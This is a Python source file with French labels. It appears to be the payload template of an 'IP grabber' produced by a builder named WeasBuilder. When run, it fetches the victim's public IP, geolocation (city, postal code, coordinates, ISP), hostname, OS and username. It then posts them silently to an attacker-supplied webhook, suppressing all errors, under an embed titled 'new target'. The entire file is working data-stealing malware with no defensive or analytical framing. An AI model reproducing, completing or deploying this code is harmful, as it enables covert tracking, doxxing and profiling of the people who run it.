import requests
import json
import platform
import os
import socket
import time
import subprocess
import sys
import threading

# Placeholder que le builder remplacera par l'URL du webhook
WEBHOOK_URL = "IP_GRABBER_WEBHOOK_PLACEHOLDER"

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json()["ip"]
    except:
        try:
            response = requests.get("https://httpbin.org/ip", timeout=5)
            return response.json()["origin"]
        except:
            return "Impossible de récupérer l'IP"

def get_geo_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,timezone", timeout=5)
        data = response.json()
        if data.get("status") == "success":
            return {
                "pays": data.get("country", "Inconnu"),
                "region": data.get("regionName", "Inconnu"),
                "ville": data.get("city", "Inconnu"),
                "code_postal": data.get("zip", "Inconnu"),
                "latitude": data.get("lat", ""),
                "longitude": data.get("lon", ""),
                "fournisseur": data.get("isp", "Inconnu"),
                "organisation": data.get("org", "Inconnu"),
                "fuseau_horaire": data.get("timezone", "Inconnu")
            }
        else:
            return None
    except:
        return None

def get_system_info():
    try:
        return {
            "hostname": socket.gethostname(),
            "os": platform.system() + " " + platform.release(),
            "architecture": platform.machine(),
            "processeur": platform.processor() or "Inconnu",
            "utilisateur": os.getlogin() if hasattr(os, "getlogin") else "Inconnu"
        }
    except:
        return {
            "hostname": "Inconnu",
            "os": "Inconnu",
            "architecture": "Inconnu",
            "processeur": "Inconnu",
            "utilisateur": "Inconnu"
        }

def send_to_webhook(data):
    try:
        payload = {
            "content": None,
            "embeds": [
                {
                    "title": "🎯 Nouvelle cible IP grabber",
                    "color": 0x00ff00,
                    "fields": [
                        {"name": "🌐 IP publique", "value": data["ip"], "inline": False},
                        {"name": "📍 Pays", "value": data["geo"].get("pays", "Inconnu"), "inline": True},
                        {"name": "🏙️ Région", "value": data["geo"].get("region", "Inconnu"), "inline": True},
                        {"name": "🗺️ Ville", "value": data["geo"].get("ville", "Inconnu"), "inline": True},
                        {"name": "📌 Code postal", "value": data["geo"].get("code_postal", "Inconnu"), "inline": True},
                        {"name": "📐 Coordonnées", "value": f"{data['geo'].get('latitude', '')}, {data['geo'].get('longitude', '')}", "inline": False},
                        {"name": "🏢 FAI", "value": data["geo"].get("fournisseur", "Inconnu"), "inline": True},
                        {"name": "🏛️ Organisation", "value": data["geo"].get("organisation", "Inconnu"), "inline": True},
                        {"name": "🕒 Fuseau horaire", "value": data["geo"].get("fuseau_horaire", "Inconnu"), "inline": True},
                        {"name": "💻 Nom d'hôte", "value": data["system"]["hostname"], "inline": True},
                        {"name": "📀 Système", "value": data["system"]["os"], "inline": True},
                        {"name": "⚙️ Architecture", "value": data["system"]["architecture"], "inline": True},
                        {"name": "🧑 Utilisateur", "value": data["system"]["utilisateur"], "inline": True}
                    ],
                    "timestamp": data["timestamp"],
                    "footer": {"text": "IP Grabber • WeasBuilder"}
                }
            ]
        }
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except:
        pass

def main():
    try:
        ip = get_public_ip()
        geo = get_geo_info(ip)
        if geo is None:
            geo = {
                "pays": "Inconnu", "region": "Inconnu", "ville": "Inconnu",
                "code_postal": "Inconnu", "latitude": "", "longitude": "",
                "fournisseur": "Inconnu", "organisation": "Inconnu", "fuseau_horaire": "Inconnu"
            }
        sys_info = get_system_info()
        timestamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        data = {
            "ip": ip,
            "geo": geo,
            "system": sys_info,
            "timestamp": timestamp
        }
        send_to_webhook(data)
    except:
        pass

if __name__ == "__main__":
    main()
